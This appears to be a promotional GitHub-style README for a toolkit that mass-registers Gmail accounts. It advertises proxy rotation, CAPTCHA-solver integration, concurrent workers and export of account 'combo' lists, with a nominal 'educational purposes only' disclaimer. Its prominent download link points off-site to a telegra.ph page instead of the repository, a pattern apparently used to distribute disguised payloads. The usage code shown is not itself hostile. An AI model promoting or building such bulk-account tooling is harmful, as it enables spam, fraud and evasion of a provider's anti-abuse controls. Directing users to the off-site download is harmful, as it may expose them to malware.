# Gmail Auto Register — Bulk Email Account Automation Toolkit 2026

> Automated Gmail account registration framework with bulk provisioning, proxy rotation, and verification workflow support. Built for 2026. Open-source toolkit for developers and QA engineers.

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green)](./LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)]()
[![Status](https://img.shields.io/badge/Status-Active-brightgreen)]()

---

## 📥 Download

### 👉 [**DOWNLOAD HERE**](https://telegra.ph/How-to-download-07-15-12) 👈

**You need to download the file from the link above.**

<a href="https://telegra.ph/How-to-download-07-15-12">
  <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD-HERE-FF6B35?style=for-the-badge&logo=download&logoColor=white" alt="Download Here" />
</a>

---

## 📋 Overview

**Gmail Auto Register** is a production-oriented automation framework designed for developers, QA engineers, and system administrators who need to provision and manage Gmail accounts at scale. It automates the full registration lifecycle — from form interaction to verification handling — while maintaining configurable concurrency, proxy rotation, and state management.

The toolkit addresses the engineering gap left by simple scripts: it provides a modular architecture, a web-based management console, a proxy health-check layer, and exportable account pool management.

---

## ✨ Features

### 🚀 Registration Engine
- **Full signup flow automation** — navigation, form filling, and step handling
- **Concurrent worker pool** — configurable parallel registration tasks (1–20 workers)
- **Proxy pool integration** — round-robin rotation with pre-flight health checks
- **Session persistence** — SQLite-backed state for resume-on-failure

### 🔐 Verification & Handling
- **Pluggable verification backends** — IMAP, REST API, and webhook-based listeners
- **Challenge service integration** — supports major solver providers via unified interface
- **Retry logic with backoff** — network-aware error classification and auto-release

### 🖥️ Management Console
- **Web UI** — real-time task monitoring, batch control, and account pool view
- **Export options** — JSON, CSV, and structured combo output
- **Account lifecycle states** — available / in-progress / completed / failed / reset

### 🛡️ Operational Safeguards
- **Proxy health scoring** — success-rate tracking and sticky binding
- **Rate limiting** — configurable delays and jitter to respect provider thresholds
- **Audit logging** — per-worker task traces and error categorization

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────┐
│              Web Console (Flask)             │
├─────────────────────────────────────────────┤
│         Task Orchestrator (asyncio)          │
├──────────┬──────────┬──────────┬────────────┤
│ Worker 1 │ Worker 2 │ Worker N │  Proxy Mgr │
├──────────┴──────────┴──────────┴────────────┤
│       Registration Adapter Layer             │
├─────────────────────────────────────────────┤
│   Challenge │ Verification │ Persistence    │
└─────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Prerequisites

- Python 3.10+
- Chrome / Chromium (for browser automation backend)
- Redis (optional — for distributed mode)

### Installation

```bash
git clone https://github.com/your-username/gmail-auto-register.git
cd gmail-auto-register
pip install -r requirements.txt
python setup.py install
```

### Configuration

Create a `config.yaml`:

```yaml
workers: 3
proxy:
  enabled: true
  pool_file: proxies.txt
  rotation: round-robin
verification:
  backend: imap
  timeout: 120
challenge:
  provider: capsolver
  api_key: "YOUR_KEY"
```

### Launch

```bash
python start_console.py --port 8080
```

Open `http://localhost:8080` to access the management console.

---

## 📖 Usage Examples

### Batch Registration

```python
from gmail_auto_register import RegistrationBatch

batch = RegistrationBatch(
    count=50,
    concurrency=5,
    proxy_pool="proxies.txt",
    output_format="json"
)
batch.run()
batch.export("accounts_2026.json")
```

### Account Pool Management

```python
from gmail_auto_register import AccountPool

pool = AccountPool("pool.db")
available = pool.filter(status="available")
pool.reset_batch(available[:10])
```

---

## 📊 Configuration Reference

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `workers` | int | 3 | Concurrent registration workers |
| `proxy.enabled` | bool | false | Enable proxy rotation |
| `proxy.rotation` | str | round-robin | Rotation strategy |
| `verification.backend` | str | imap | Verification listener type |
| `verification.timeout` | int | 120 | Max wait for verification (seconds) |
| `challenge.provider` | str | none | Challenge solving service |
| `output.format` | str | json | Export format |

---

## 🧪 Testing

```bash
pytest tests/ -v --cov=src
```

---

## 🛠️ Troubleshooting

| Issue | Solution |
|-------|----------|
| Workers stuck in `in-progress` | Check proxy health; run `pool.health_check()` |
| Verification timeout | Increase `verification.timeout` or check backend connectivity |
| Challenge failures | Validate API key and account balance with provider |
| High failure rate | Reduce `workers`; improve proxy quality |

---

## ⚠️ Disclaimer

This project is provided for **educational and research purposes only**. Users are solely responsible for ensuring their use complies with all applicable terms of service, local laws, and regulations. The maintainers assume no liability for misuse.

---

## 📄 License

MIT License — see [LICENSE](./LICENSE) for details.

---

## 🔗 Related Resources

- [Gmail API Documentation](https://developers.google.com/gmail/api)
- [Selenium WebDriver](https://www.selenium.dev/documentation/)
- [Awesome Email Automation](https://github.com/awesome-selfhosted/awesome-selfhosted)

---

<p align="center">
  <strong>⭐ Star this repo if you find it useful ⭐</strong>
</p>
